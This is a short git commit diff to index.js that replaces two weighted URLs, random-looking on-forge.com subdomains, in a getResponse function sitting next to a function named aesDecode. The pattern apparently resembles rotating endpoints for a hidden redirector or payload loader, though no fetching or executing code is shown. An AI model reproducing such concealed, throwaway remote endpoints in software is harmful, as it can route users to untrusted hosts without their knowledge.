9813662f3385ec8e821e992dee66783d7e2a9e1e
animalinside <akshay.anand12@yahoo.com>
2026-05-14 14:13:49 +0530

    Modify URLs in getResponse function
    Updated the links in the getResponse function.

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://hjhgfdfsfgdfg.on-forge.com/", weight: 0.5 },
-        { url: "https://aghjggfdsfgfg.on-forge.com/", weight: 0.5 }
+        { url: "https://ajfsdjkjddfjjf.on-forge.com/", weight: 0.5 },
+        { url: "https://jhdkslfjjdgjf.on-forge.com/", weight: 0.5 }
       
     ];
 
